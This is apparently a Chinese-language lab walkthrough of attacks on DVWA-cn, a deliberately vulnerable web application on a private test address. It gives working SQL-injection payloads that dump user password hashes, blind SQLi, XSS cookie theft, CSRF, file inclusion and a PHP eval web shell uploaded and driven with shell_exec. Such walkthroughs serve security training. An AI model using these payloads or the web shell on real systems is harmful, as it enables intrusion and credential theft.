#编码规则

- url编码

```
%20='='

%23='#'

%27='''

%C8%B7%B6%A8='gb2312(确定)'
```

- ascii编码

```
0x3a=':'

CHAR(32,58,32)=('空格',':','空格')
```


#漏洞1: SQL 注入

测试方法：

>点击获取数据库基本信息

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,CONCAT_WS(CHAR(32,58,32),user(),database(),version())%20%23&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: -1' UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) #
First name: 1
Surname: root@localhost : dvwacn : 5.5.41-0ubuntu0.14.04.1-log
```

> 点击获取数据库所有表

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20%23&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: -1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() #
First name: 1
Surname: guestbook

ID: -1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() #
First name: 1
Surname: users
```


> 点击获取users表的字段

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273%20%23&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: user_id

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: first_name

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: last_name

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: user

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: password

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: avatar

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: last_login

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: failed_login

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: id

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: uuid

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: name

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: slug

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: email

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: image

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: cover

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: bio

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: website

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: location

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: accessibility

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: status

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: language

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: meta_title

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: meta_description

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: tour

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: created_at

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: created_by

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: updated_at

ID: -1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 #
First name: 1
Surname: updated_by
```

> 点击获取users表的内容

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli/?id=-1%27%20UNION%20SELECT%201,concat(user,0x3a,password)%20from%20users%20%23&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: admin:21232f297a57a5a743894a0e4a801fc3

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: gordonb:e99a18c428cb38d5f260853678922e03

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: 1337:8d3533d75ae2c3966d7e0d4fcc69216b

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: pablo:0d107d09f5bbe40cade3de5c71e9e9b7

ID: -1' UNION SELECT 1,concat(user,0x3a,password) from users #
First name: 1
Surname: smithy:5f4dcc3b5aa765d61d8327deb882cf99
```


#漏洞2: SQL 盲注

测试方法：

> 测试是否有注入,对比页面返回 1=1

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%201=1%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and 1=1 and '1'='1
First name: admin
Surname: admin
```

> 测试是否有注入,对比页面返回 1=2

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%201=2%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
空白
```

> 测试数据库版本,有数据说明数据库版本为5.0

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(version(),1)=5%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```


页面返回:

```
ID: 1' and left(version(),1)=5 and '1'='1
First name: admin
Surname: admin
```

> 测试数据库长度,有数据说明长度正确

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())=6%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```


页面返回:

```
ID: 1' and length(database())=6 and '1'='1
First name: admin
Surname: admin
```


> 测试数据库名称第1个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),1)=%27d%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and left(database(),1)='d' and '1'='1
First name: admin
Surname: admin
```


> 测试数据库名称第2个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),2)=%27dv%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and left(database(),2)='dv' and '1'='1
First name: admin
Surname: admin
```

> 测试数据库名称第3个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),3)=%27dvw%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```


页面返回:

```
ID: 1' and left(database(),3)='dvw' and '1'='1
First name: admin
Surname: admin
```

> 测试数据库名称第4个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),4)=%27dvwa%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and left(database(),4)='dvwa' and '1'='1
First name: admin
Surname: admin
```


> 测试数据库名称第5个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),5)=%27dvwac%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and left(database(),5)='dvwac' and '1'='1
First name: admin
Surname: admin
```

> 测试数据库名称第6个字符

```
http://192.168.56.80/dvwacn/vulnerabilities/sqli_blind/?id=1%27%20and%20left(database(),6)=%27dvwacn%27%20and%20%271%27=%271&Submit=%C8%B7%B6%A8
```

页面返回:

```
ID: 1' and left(database(),6)='dvwacn' and '1'='1
First name: admin
Surname: admin
```

#漏洞3: 反射型跨站

测试方法：

```
http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('xss')%3C/script%3E
```

页面返回:

```
xss
```

```
http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

页面返回:

```
security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
```

#漏洞4: 存储型跨站

测试方法：

用户输入:

```
用户名：xss

信 息：<script>alert('xss')</script>
```

捕获的http数据包：

```
POST /dvwacn/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

txtName=xss&mtxMessage=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&btnSign=%B7%A2%CB%CD%CF%FB%CF%A2
```

页面返回:

```
xss
```

用户输入:

```
用户名：xss

信 息：<script>alert(document.cookie)</script>
```

捕获的http数据包：

```
POST /dvwacn/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

txtName=xss&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=%B7%A2%CB%CD%CF%FB%CF%A2
```


页面返回:

```
security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
```

#漏洞5: 跨站请求伪造 (CSRF)


测试方法：

用户输入:

```
请输入新密码: admin

请再输入一次: admin
```

捕获的http数据包：

```
GET /dvwacn/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=%B8%FC%B8%C4 HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/csrf/
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
```

页面返回：

```
密码已更改。
```


#漏洞6: 暴力破解

测试方法：

http://192.168.56.80/dvwacn/vulnerabilities/brute/

用户输入：

```
用户名：admin

密码：12345
```

```
http://192.168.56.80/dvwacn/vulnerabilities/brute/?username=admin&password=12345&Login=%B5%C7%C2%BD#
```

页面返回：

```
用户名或者密码错误。
```

暴力破解密码（变量password=§12345§）

```
GET /dvwacn/vulnerabilities/brute/?username=admin&password=§12345§&Login=%B5%C7%C2%BD HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/brute/?username=admin&password=1&Login=%B5%C7%C2%BD
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
```

状态

```
payload admin
status 200
length 6291
```

页面返回：

```
登陆成功，您可以进行其他操作。admin
```

#漏洞7: 代码执行

测试方法：

用户输入：

```
请在下面文本框中输入一个ip地址: 8.8.8.8
```


捕获数据包：

```
POST /dvwacn/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/exec/
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

ip=8.8.8.8&submit=%C8%B7%B6%A8
```


页面返回：

```
PING 202.106.0.20 (202.106.0.20) 56(84) bytes of data.

--- 202.106.0.20 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 1999ms
```

#漏洞8: 不安全的验证码

测试方法：

用户点击：

```
单击我测试
```

捕获的http数据包：

```
POST /dvwacn/vulnerabilities/captcha/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/captcha/
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

step=2&password_new=admin888&password_conf=admin888&Change=%B5%A5%BB%F7%CE%D2%B2%E2%CA%D4
```

页面返回：

```
密码已更改。
```


#漏洞9: 文件包含

测试方法：

```
http://192.168.56.80/dvwacn/vulnerabilities/fi/?page=../../phpinfo.php
```

页面返回：

```
phpinfo信息
```

```
http://192.168.56.80/dvwacn/vulnerabilities/fi/?page=../../include.txt
```

页面返回：

```
here is file inclution test!!!!!! code is excute here
```


#漏洞10: 文件上传


> 引用：

> sql注入漏洞上传文件:

```
select '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/mm.php'
```
测试方法：

用户点击：

```
浏览-->mm.php-->上传
```

mm.php内容：

```
<?php @eval($_POST[cmd]);?>
```

页面返回；

```
../../hackable/uploads/mm.php上传成功!
```

木马url：

```
http://192.168.56.80/dvwacn/hackable/uploads/mm.php
```

本地利用文件：

local.html

内容：

```
<html>
<body>
<form action="http://192.168.56.80/dvwacn/hackable/uploads/mm.php" method="post">
<input type="text" name="cmd" value="phpinfo();">
<input type="submit" value="submit">
</form>
</body>
</html>
```

访问local.html

输入：

```
$output = shell_exec('pwd');echo "<pre>$output</pre>";
```

输出：

```
/var/www/dvwacn/hackable/uploads
```

输入：

```
$output = shell_exec('ls -lh');echo "<pre>$output</pre>";
```

输出：

```
total 4.0K
-rw-r--r-- 1 www-data www-data 27 Jul 18 17:07 mm.php
```

#漏洞11: WebServices 命令执行

测试方法：

> 使用BurpSuite配合测试

用户输入：

```
请在下面文本框中输入一个ip地址: 8.8.8.8
```

捕获的http数据包：

```
POST /dvwacn/vulnerabilities/ws-exec/ws-commandinj.php HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset="utf-8"
X-Requested-With: XMLHttpRequest
Referer: http://192.168.56.80/dvwacn/vulnerabilities/ws-exec/
Content-Length: 292
Cookie: security=low; PHPSESSID=qbi7g6m5rp94phgcgc7g7681b7
Connection: close

<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><pingAddressLow xmlns="http://localhost"><address>8.8.8.8</address></pingAddressLow></soap:Body></soap:Envelope>
```


返回的数据包；

```
HTTP/1.1 200 OK
Date: Mon, 18 Jul 2016 09:16:36 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.8
X-SOAP-Server: NuSOAP/0.9.5 (1.123)
Vary: Accept-Encoding
Content-Length: 518
Connection: close
Content-Type: text/xml; charset=gb2312

<?xml version="1.0" encoding="gb2312"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:pingAddressLowResponse xmlns:ns1="http://localhost"><return xsi:type="xsd:string"></return></ns1:pingAddressLowResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
```









